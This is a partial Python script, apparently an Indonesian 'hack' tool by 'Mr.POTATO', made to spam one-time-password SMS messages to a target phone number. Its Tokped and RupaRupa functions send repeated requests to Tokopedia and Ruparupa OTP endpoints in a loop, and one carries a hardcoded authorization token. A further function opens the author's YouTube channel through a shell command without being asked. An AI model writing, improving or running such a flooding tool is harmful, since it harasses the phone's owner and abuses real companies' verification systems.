...
# Creator :  Mr.POTATO
# Team : CYBER_WHITE_HAT_INDONESIA
# Never Mind
...
def Banner():
 ...
 |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|
       |_|
                   '''+W+'Creator : ./Mr POTATO \n\t\t   Youtube : Laskar17 Channel')


print
___________________________________
< **Wellcome To hack by Mr.POTATO** >
 -----------------------------------
    \
     \
                                   .::!!!!!!!:.
  ...
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      ...
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
             """"          """""""
                  __  __      ____   ___ _____  _  _____ ___
__/\____/\____/\_|  \/  |_ __|  _ \ / _ \_   _|/ \|_   _/ _ \__/\____/\____/\__
\    /\    /\    / |\/| | '__| |_) | | | || | / _ \ | || | | \    /\    /\    /
/_  _\/_  _\/_  _\ |  | | | _|  __/| |_| || |/ ___ \| || |_| /_  _\/_  _\/_  _\
...
def RupaRupa():
        ...
        for x in range(jumlah):
                try:
                        ...
                        'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3>
                        'x-company-name' : 'odi'
...
def Tokped():
        ...
        for x in range(jumlah):
                try:
                        ...
                        site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+number+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%>
...
def Spam():
        ...
        sleep(1.5)
        os.system('xdg-open https://www.youtube.com/Laskar17Channel')
        os.system('clear')
        sleep(1.3)
        Banner()
        print
